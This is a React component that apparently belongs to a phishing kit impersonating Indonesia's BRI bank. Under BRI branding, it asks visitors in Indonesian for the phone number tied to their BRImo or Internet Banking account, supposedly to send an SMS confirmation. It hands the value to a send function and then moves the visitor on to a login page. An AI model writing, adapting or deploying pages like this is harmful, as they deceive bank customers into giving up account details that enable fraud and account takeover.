import { useEffect } from 'react';
import '../assets/css/App.css';
import top from '../assets/img/bri-header.png'
import hp from '../assets/img/phone.png'
import {Link} from 'react-router-dom'

function Notlp(props) {
    const filled = (e) => {
      props.tlp(e.target.value)
      document.querySelector('.btn-disable').classList.remove('btn-disable')
    } 

  return (
    <div className='App-v4'>
    <nav>
        <img src={top} width="70px" />
    </nav>
    <br /><br /><br /><br />
    <h4 className='hh4'> 
    Masukkan nomor telpon yang terdaftar di <br/>akun BRImo/Internet Banking Anda, untuk<   br/> mendapatkan SMS KONFIRMASI
    </h4>
    <br /><br />
    <img src={hp} width="70%" /><br />
    <h4 className='h4'>Nomer Handphone</h4>
    <input type="text" minLength={10} maxLength={13} className='intlp' placeholder='08xxx' onInput={filled}/>
    <Link onClick={props.send} className="dp" to='/login'>
    <button className='nxt btn-disable'>Selanjutnya</button>
    </Link>
    </div>
  );
}

export default Notlp;
